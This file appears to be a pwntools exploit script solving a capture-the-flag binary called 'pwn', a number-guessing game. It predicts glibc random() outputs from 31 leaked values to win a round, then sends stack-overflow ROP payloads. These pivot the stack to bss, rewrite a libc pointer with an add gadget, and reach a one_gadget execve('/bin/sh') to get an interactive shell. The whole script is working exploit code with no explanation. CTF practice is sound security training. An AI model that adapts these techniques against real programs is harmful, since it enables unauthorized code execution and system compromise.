# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
#context.terminal = ["/bin/tmux","sp","-h"]

# io = remote('127.0.0.1',49161 )
# libc = ELF('./libc-2.31.so')
io = process('./pwn')
context.arch = "amd64"
elf = ELF('./pwn')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

def game(idx):
	for i in range(idx):
		sla("guess number?[y/n]",'y')
		sla("guess[0]: ","\n")
		sla("guess[1]: ","\n")
		sla("guess[2]: ","\n")
		sla("guess[3]: ","\n")
		sla("guess[4]: ","\n")
		sla("guess number?[y/n]",'6')
		sla("Give Up? [y/n]",'y')
		ru("the number is ")
		randnu = int(ru("\n"),16)
		randnum.append(randnu)
		sla("continue guess? [y/n]",'y')
	#o[n] == o[n-31] + o[n-3] 
	#randnum[0] = (randnum[31]-randnum[28])&0x7FFFFFFF #n=31
	#randnum[1] = (randnum[32]-randnum[29])&0x7FFFFFFF #n=32
	randnum.append((randnum[2]+randnum[33-3])&0x7FFFFFFF) #n=33
	print(randnum,len(randnum))


pop_rsi = 0x000000000040153d
bss = 0x4040A0
bss=0x4140C0
new_stack = bss + 0x3000
leave_ret = 0x4015e6
pop_rdx = 0x401543

read_plt = elf.plt['read']
# print(hex(read_plt))
# pause()
#add dword ptr [rbp - 0x3d], ebx ; nop ; ret
add_dp_rbp_ebx = 0x000000000040125c
ret = 0x4015e7

libc_start_main = 0x401190
randnum = [0]*2
mycanary = 0

game(31)
sla("guess number?[y/n]",'y')
sla("guess[0]: ",str(randnum[33]))

pay = b'a'*0x30 + p64(new_stack - 0x8)*3
pay += p64(pop_rsi) + p64(new_stack) + p64(read_plt) + p64(leave_ret)
sleep(1)
#dbg()
#pause()
sla('you win!\n',pay)

payload = p64(libc_start_main)
sn(payload)
#irt()
randnum = [0]*2
game(31)
sla("guess number?[y/n]",'y')
#dbg()
#pause()
sla("guess[0]: ",str(randnum[33]))
new_stack = bss + 0x4000
pay = b'a'*0x30 + p64(new_stack - 0x8)*3
pay += p64(pop_rsi) + p64(new_stack) + p64(read_plt) + p64(leave_ret)
sleep(1)
sla('you win!\n',pay)

payload = p64(libc_start_main)
sleep(1)
#dbg()
#pause()
sn(payload)

#randnum = [0]*2
#game(31)
#sla("guess number?[y/n]",'y')
#dbg()
#pause()
#sla("guess[0]: ",str(randnum[33]))
#new_stack = bss + 0x5000
#pay = 'a'*0x30 + p64(new_stack - 0x8)*3
#pay += p64(pop_rsi) + p64(new_stack) + p64(read_plt) + p64(leave_ret)
#sleep(1)
#dbg()
#pause()
#sla('you win!\n',pay)

#payload = p64(libc_start_main)
#sleep(1)
#sn(payload)

#pop_rdi = 0x000000000002a6c5
libc_ptr1 = bss + 0x3000 - 0x68 
libc_ptr2 = bss + 0x4000 - 0x68
pop_rbp = 0x000000000040125d
pop_rbx = 0x0000000000401540
one = 0xebc88		# execve("/bin/sh",0,0)  one_gadget /lib/x86_64-linux-gnu/libc.so.6 结果中选择一个进行尝试

payload = b'a'*0x30 + p64(libc_ptr1+0x3d)*3
payload += p64(pop_rbx) + p64(0xc0c75) + p64(add_dp_rbp_ebx) #change libc_ptr1 to one
payload += p64(pop_rbp) + p64(libc_ptr1 - 0x8) + p64(pop_rsi) +p64(0) + p64(pop_rdx) + p64(0) + p64(leave_ret)

#dbg()

randnum = [0]*2
game(31)
sla("guess number?[y/n]",'y')


sla("guess[0]: ",str(randnum[33]))
sleep(1)

dbg()
pause()



sla('you win!\n',payload)
irt()
